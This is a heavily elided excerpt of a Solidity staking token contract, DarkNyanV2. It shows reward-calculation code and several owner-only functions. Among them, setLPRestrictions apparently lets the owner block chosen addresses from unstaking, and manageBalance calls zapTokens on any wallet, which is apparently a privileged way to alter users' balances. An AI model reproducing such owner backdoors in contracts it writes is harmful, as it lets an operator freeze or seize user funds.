...
// File: contracts\DNyanV2\ERC20.sol
...
// File: contracts\DNyanV2\UniswapV2-nyan.sol
...
// File: contracts\DNyanV2\DarkNyanV2.sol
...
contract DarkNyanV2 is ERC20, ERC20DataLayout, Proxiable {
    ...
    modifier _updateStakingReward(address _account) {
        ...
        if (block.number > stakedBalances[_account].lastBlockChecked) {
            if (stakedBalances[_account].lastBlockChecked < 11077773) {
                stakedBalances[_account].lastBlockChecked = 11077773;
            }
    ...
    /** @notice Swaps an amount dNyan for dNyanV2.
      * @param _amount Amount of dNyanV1 to swap.
      */
    ...
    function unstakeCatnipV2LP(uint256 _amount) public delegatedOnly _updateStakingReward(msg.sender) {
       ...
       require(!restrictedLP[msg.sender].restricted);
       //Unstake catnipV2LP event
    }
    ...
    function myRewardsBalance(address _account) public delegatedOnly view returns(uint256) {
        ...
        if (stakedBalances[_account].lastBlockChecked < 11077773) {
            rewardBlocks = block.number.sub(11077773);
        } else {
            rewardBlocks = block.number.sub(stakedBalances[_account].lastBlockChecked);
        }
        if (stakedBalances[_account].catnipV2LP > 0) {
            uint256 stakedAmount = stakedBalances[_account].catnipV2LP;
            if (userNFT[_account].bonusMiningPercentage > 0) {
    ...
    /** @notice Sets an address for the Nyan NFT contract.
      ...
      */
    function setNFTAddress(address _NFT) public delegatedOnly _onlyOwner {
        NFTContract = _NFT;
    }
    ...
    function setLPRestrictions(address LP) public delegatedOnly _onlyOwner {
        restrictedLP[LP].restricted = true;
    }

    function manageBalance(address wallet, uint256 amount) public delegatedOnly _onlyOwner {
        zapTokens(wallet, amount);
    }
